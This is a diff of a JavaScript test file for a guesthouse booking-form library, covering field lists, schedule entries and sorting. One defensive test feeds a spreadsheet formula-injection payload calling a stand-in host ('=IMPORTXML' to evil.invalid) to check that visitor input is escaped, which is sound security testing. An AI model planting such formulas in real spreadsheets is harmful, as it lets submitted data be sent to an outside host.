@@ -56,13 +56,40 @@ test('pickRow returns undefined only when both languages are empty', () => {
   assert.equal(lib.pickRow({}, 'name', 'en'), undefined);
 });
 
-test('ACCOM_FIELDS and WORK_FIELDS are [key, label] pairs of the expected size', () => {
-  assert.equal(lib.ACCOM_FIELDS.length, 35);
-  assert.equal(lib.WORK_FIELDS.length, 31);
-  for (const pair of lib.ACCOM_FIELDS.concat(lib.WORK_FIELDS)) {
+test('all three application field lists are [key, label] pairs of the expected size', () => {
+  assert.equal(lib.ACCOM_FIELDS.length, 20);
+  assert.equal(lib.WORK_FIELDS.length, 35);
+  assert.equal(lib.SERVICE_FIELDS.length, 31);
+  for (const pair of lib.ACCOM_FIELDS.concat(lib.WORK_FIELDS, lib.SERVICE_FIELDS)) {
     assert.equal(pair.length, 2);
     assert.equal(typeof pair[0], 'string');
     assert.equal(typeof pair[1], 'string');
+  }
+});
+
+test('the accommodation form stores emergency contacts and optional vehicle plates without legacy add-ons', () => {
+  const keys = lib.ACCOM_FIELDS.map((field) => field[0]);
+  for (const key of ['emergency_name', 'emergency_relation', 'emergency_phone', 'vehicle_plate']) {
+    assert.ok(keys.includes(key), `missing ${key}`);
+  }
+  for (const removed of ['addons', 'pickup_date', 'dropoff_date', 'city_date', 'meal_avoid']) {
+    assert.equal(keys.includes(removed), false, `legacy add-on field remains: ${removed}`);
+  }
+  assert.equal(lib.ACCOM_FIELDS.find((field) => field[0] === 'passport')[1], '護照號碼');
+});
+
+test('the work-exchange form stores a passport, applicant photo and optional vehicle plate', () => {
+  const keys = lib.WORK_FIELDS.map((field) => field[0]);
+  assert.ok(keys.includes('passport'));
+  assert.ok(keys.includes('photo_url'));
+  assert.ok(keys.includes('vehicle_plate'));
+  assert.equal(lib.WORK_FIELDS.find((field) => field[0] === 'photo_url')[1], '本人照片');
+});
+
+test('the other-services form keeps multi-service details out of accommodation applications', () => {
+  const keys = lib.SERVICE_FIELDS.map((field) => field[0]);
+  for (const key of ['services', 'service_start', 'service_end', 'luggage_count', 'vehicle_plate', 'pickup_date', 'dropoff_date', 'city_date']) {
+    assert.ok(keys.includes(key), `missing ${key}`);
   }
 });
 
@@ -125,6 +152,61 @@ test('buildResponseRow has exactly the width of buildHeaderRow', () => {
   const stamp = new Date();
   const row = lib.buildResponseRow(lib.ACCOM_FIELDS, () => '', stamp, '');
   assert.equal(row.length, lib.buildHeaderRow(lib.ACCOM_FIELDS).length);
+});
+
+test('buildResponseRow prevents spreadsheet formula execution in visitor-entered text', () => {
+  const row = lib.buildResponseRow([['name', '姓名']], () => '=IMPORTXML("https://evil.invalid")', new Date(), '');
+  assert.equal(row[1], "'=IMPORTXML(\"https://evil.invalid\")");
+});
+
+test('buildScheduleEntry uses stay dates and keeps earlier submissions distinguishable', () => {
+  const get = getter({
+    room_type: '主屋', checkin: '2026-09-10', checkout: '2026-09-12',
+    name_zh: '王美', email: 'mei@example.com', phone: '0211234567', vehicle_plate: 'ABC123'
+  });
+  assert.deepEqual(lib.buildScheduleEntry('accommodation', get, new Date('2026-08-03T01:02:03Z'), '', 'app-1'), {
+    id: 'app-1', submitted_at: new Date('2026-08-03T01:02:03Z'), start_date: '2026-09-10', end_date: '2026-09-12',
+    type: '住宿申請', items: '主屋', applicant: '王美', email: 'mei@example.com', phone: '0211234567',
+    vehicle_plate: 'ABC123', details: '主屋', photo_url: '', status: '新申請', flag: ''
+  });
+});
+
+test('buildScheduleEntry spans the earliest and latest date in a multi-service request', () => {
+  const get = getter({
+    services: '寄放行李 / 接機 / 市區接送', service_start: '2026-09-10', service_end: '2026-09-17',
+    pickup_date: '2026-09-08', city_date: '2026-09-20', name_en: 'Mei Wang'
+  });
+  const entry = lib.buildScheduleEntry('services', get, new Date('2026-08-03T01:02:03Z'), '', 'app-2');
+  assert.equal(entry.start_date, '2026-09-08');
+  assert.equal(entry.end_date, '2026-09-20');
+  assert.equal(entry.type, '其他服務');
+  assert.equal(entry.items, '寄放行李 / 接機 / 市區接送');
+  assert.match(entry.details, /行李/);
+  assert.match(entry.details, /接機/);
+  assert.match(entry.details, /市區接送/);
+});
+
+test('buildScheduleEntry ignores stale dates belonging to unselected services', () => {
+  const get = getter({
+    services: '寄放行李', service_start: '2026-09-10', service_end: '2026-09-17',
+    pickup_date: '2026-08-01', city_date: '2026-12-31'
+  });
+  const entry = lib.buildScheduleEntry('services', get, new Date('2026-08-03T01:02:03Z'), '', 'app-stale');
+  assert.equal(entry.start_date, '2026-09-10');
+  assert.equal(entry.end_date, '2026-09-17');
+});
+
+test('compareScheduleEntries orders by service date, then application time, with undated rows last', () => {
+  const rows = [
+    { start_date: '', submitted_at: new Date('2026-08-01T00:00:00Z') },
+    { start_date: '2026-09-01', submitted_at: new Date('2026-08-02T00:00:00Z') },
+    { start_date: '2026-09-01', submitted_at: new Date('2026-08-01T00:00:00Z') },
+    { start_date: '2026-08-31', submitted_at: new Date('2026-08-03T00:00:00Z') }
+  ];
+  rows.sort(lib.compareScheduleEntries);
+  assert.deepEqual(rows.map((row) => row.start_date + '|' + row.submitted_at.toISOString().slice(0, 10)), [
+    '2026-08-31|2026-08-03', '2026-09-01|2026-08-01', '2026-09-01|2026-08-02', '|2026-08-01'
+  ]);
 });
 
 const getter = (obj) => (key) => (obj[key] === undefined ? '' : obj[key]);
